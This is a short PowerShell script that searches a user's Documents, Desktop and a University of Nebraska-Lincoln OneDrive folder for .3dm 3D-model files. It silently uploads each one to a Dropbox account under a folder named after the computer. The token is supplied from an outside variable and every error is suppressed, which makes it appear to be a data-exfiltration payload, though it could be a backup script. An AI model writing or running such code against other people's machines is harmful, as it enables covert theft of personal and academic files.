# Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Dropbox configuration
$accessToken = $db
$localFolders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

# Create folder in Dropbox
$computerName = $env:COMPUTERNAME
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}
$folderBody = @{
    "path" = "/$computerName"
    "autorename" = $true
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $folderBody
} catch { <# Folder likely exists #> }

# Upload files
$headers["Content-Type"] = "application/octet-stream"
foreach ($folder in $localFolders) {
    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        $relativePath = $_.FullName.Replace($folder, '').TrimStart('\')
        $dropboxPath = "/$computerName/$relativePath".Replace('\', '/')
        
        $uploadArgs = @{
            "path" = $dropboxPath
            "mode" = "add"
            "autorename" = $true
            "mute" = $false
        } | ConvertTo-Json -Compress
        
        $headers["Dropbox-API-Arg"] = $uploadArgs
        
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
            Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes | Out-Null
        } catch { <# Silent failure #> }
    }
}

# Keep window open for debugging (remove in production)
Start-Sleep -Seconds 30
